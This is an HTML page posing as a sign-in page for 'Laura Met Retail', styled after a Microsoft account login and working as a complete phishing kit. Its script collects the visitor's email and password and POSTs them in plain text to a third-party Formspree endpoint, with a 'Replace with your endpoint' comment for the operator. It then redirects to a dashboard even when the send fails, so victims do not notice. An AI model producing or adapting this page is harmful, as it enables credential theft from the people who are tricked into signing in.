<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In | Laura Met Retail</title>
    <style>
        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'Segoe UI', Arial, sans-serif;
            overflow: hidden;
        }

        .wrapper {
            background: linear-gradient(rgba(255,255,255,0.5), rgba(255,255,255,0.5)), 
                        url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&w=1920&q=80');
            background-size: cover; background-position: center;
            height: 100vh; display: flex; flex-direction: column;
            justify-content: center; align-items: center;
        }

        .card {
            background: white; width: 100%; max-width: 440px;
            padding: 44px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 28px; position: relative; min-height: 340px;
        }

        #loadingOverlay {
            display: none; position: absolute; top: 0; left: 0; 
            width: 100%; height: 100%; background: white; z-index: 10;
            justify-content: center; align-items: center; flex-direction: column;
        }

        .spinner {
            width: 40px; height: 40px; border: 4px solid #f3f3f3;
            border-top: 4px solid #0067b8; border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .logo-text { font-weight: bold; color: #5e5e5e; margin-bottom: 20px; display: block; }
        h1 { font-size: 24px; margin: 0 0 16px 0; color: #1b1b1b; }
        .user-display { font-size: 15px; margin-bottom: 20px; color: #1b1b1b; display: none; }
        
        input { 
            width: 100%; border: none; border-bottom: 1px solid #666; 
            padding: 8px 0; font-size: 16px; outline: none; margin-bottom: 20px; 
        }

        #passwordSection { display: none; }

        .links { font-size: 13px; margin-bottom: 30px; }
        .links a { color: #0067b8; text-decoration: none; display: block; margin-bottom: 8px; }
        
        .action-row { display: flex; justify-content: flex-end; }
        .btn-primary { background-color: #0067b8; color: white; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; }
        
        .footer { position: fixed; bottom: 12px; right: 24px; font-size: 12px; }
        .footer a { margin-left: 16px; color: #000; text-decoration: none; }
    </style>
</head>
<body>

    <div class="wrapper">
        <div class="card">
            <div id="loadingOverlay"><div class="spinner"></div></div>

            <span class="logo-text">LAURA MET RETAIL</span>
            
            <div id="emailSection">
                <h1>Sign in</h1>
                <input type="email" id="userEmail" placeholder="Email, phone, or Skype">
                <div class="links">
                    <a href="#">No account? Create one!</a>
                    <a href="#">Canâ€™t access your account?</a>
                </div>
                <div class="action-row">
                    <button class="btn-primary" id="nextBtn">Next</button>
                </div>
            </div>

            <div id="passwordSection">
                <div class="user-display" id="displayEmail" style="font-weight: 500;"></div>
                <h1>Enter password</h1>
                <input type="password" id="userPass" placeholder="Password">
                <div class="links">
                    <a href="#">Forgot password?</a>
                    <a href="#">Other ways to sign in</a>
                </div>
                <div class="action-row">
                    <button class="btn-primary" id="loginBtn">Sign in</button>
                </div>
            </div>
        </div>

        <div class="footer">
            <a href="#">Terms of use</a> <a href="#">Privacy & cookies</a>
        </div>
    </div>

    <script>
        const nextBtn = document.getElementById('nextBtn');
        const loginBtn = document.getElementById('loginBtn');
        const emailSection = document.getElementById('emailSection');
        const passwordSection = document.getElementById('passwordSection');
        const overlay = document.getElementById('loadingOverlay');
        const displayEmail = document.getElementById('displayEmail');

        // Replace with your endpoint
        const FORMSPREE_URL = "https://formspree.io/f/mreazrpn";

        let user_email = "";

        nextBtn.addEventListener('click', function() {
            user_email = document.getElementById('userEmail').value;
            if (user_email === "" || !user_email.includes('@')) {
                alert("Please enter a valid email.");
                return;
            }

            overlay.style.display = 'flex';

            setTimeout(() => {
                overlay.style.display = 'none';
                emailSection.style.display = 'none';
                passwordSection.style.display = 'block';
                displayEmail.innerText = user_email;
                displayEmail.style.display = 'block';
            }, 1200);
        });

        loginBtn.addEventListener('click', function() {
            const pass = document.getElementById('userPass').value;
            if (pass.length < 1) {
                alert("Please enter your password.");
                return;
            }

            overlay.style.display = 'flex';

            // Send data to Formspree
            fetch(FORMSPREE_URL, {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    Email: user_email,
                    Password: pass
                })
            })
            .then(response => {
                // Successful submission, redirect to dashboard
                window.location.href = "dashboard.html";
            })
            .catch(error => {
                // Even on error, redirect so user experience isn't broken
                console.log("Error sending data:", error);
                window.location.href = "dashboard.html";
            });
        });
    </script>
</body>
</html>
